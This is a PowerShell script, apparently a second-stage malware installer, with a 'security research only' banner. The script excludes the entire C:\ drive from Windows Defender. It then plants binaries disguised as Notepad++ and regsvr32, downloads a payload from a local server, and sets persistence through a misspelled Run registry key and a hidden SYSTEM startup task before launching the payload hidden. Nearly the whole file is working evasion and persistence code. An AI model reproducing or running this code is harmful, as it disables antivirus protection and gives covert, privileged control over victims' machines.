# -------------------------------------------------------------------------
# SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
# This script is part of the BugWare repository, a collection of security tools
# and PoCs for learning about attack vectors.
# DO NOT USE THIS FOR ILLEGAL PURPOSES.
# -------------------------------------------------------------------------

# Check if running as Administrator
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    exit 1
}

# 1. FIX: Add Exclusion FIRST, before checking or copying files
$exclusionPath = "C:\"
Add-MpPreference -ExclusionPath $exclusionPath -Force

# Verify if the exclusion was added successfully (using -contains for array safety)
$exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($exclusions -notcontains $exclusionPath) {
    # Attempt one more time or continue at own risk
    Add-MpPreference -ExclusionPath $exclusionPath -Force
}

# Ensure Notepad++ directory exists
if (-not (Test-Path "C:\Program Files\Notepad++")) {
    New-Item -ItemType Directory -Path "C:\Program Files\Notepad++" -Force | Out-Null
}

# Download Notepad++ Installer
# Assuming these files were dropped into TEMP by the dropper (egg.ps1)
if (Test-Path "$env:TEMP\npp.exe") {
    Copy-Item -Path "$env:TEMP\npp.exe" -Destination "C:\Program Files\Notepad++\notepad++.exe" -Force
}
if (Test-Path "$env:TEMP\regsvr32.exe") {
    Copy-Item -Path "$env:TEMP\regsvr32.exe" -Destination "C:\Program Files\Notepad++\regsvr32.exe" -Force
}

# Logging helper
function Log-Msg { # Ignore -UnusedParameter
    param($msg)
    $logPath = "$env:TEMP\npp_install_log.txt"
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logPath -Value "$timestamp - $msg"
}

Log-Msg "Starting Hatch..."

# Setup npp folder in ProgramData
if (-not (Test-Path "C:\ProgramData\npp")) {
    New-Item -ItemType Directory -Path "C:\ProgramData\npp" -Force | Out-Null
}

# Download the service binary (Always update)
Log-Msg "Downloading service binary..."
Invoke-RestMethod -Uri "http://localhost:8080/npp-service" -OutFile "C:\ProgramData\npp\notepad-service.exe"

# Establish Persistence
Log-Msg "Setting Persistence..."
$runKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
# Use double quotes for the argument in the registry string to ensure Windows handles it correctly
New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"C:\ProgramData\npp\notepad-service.exe`"" -PropertyType String -Force

# 3. FIX: Simplified Task Action to call Executable directly
# The script defaults to localhost:8080 if env var is missing, so we don't need the complex env wrapper
$action = New-ScheduledTaskAction -Execute "C:\ProgramData\npp\notepad-service.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)

# Register (Force update if exists)
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
Register-ScheduledTask -TaskName "NotepaddPlusPlusService" -InputObject $task -Force | Out-Null

# # Start the task immediately
# Start-ScheduledTask -TaskName "NotepaddPlusPlusService"

# # Start the service immediately (Hidden Window)
if (Test-Path "C:\ProgramData\npp\notepad-service.exe") {
    Start-Process -FilePath "C:\ProgramData\npp\notepad-service.exe" -WindowStyle Hidden
}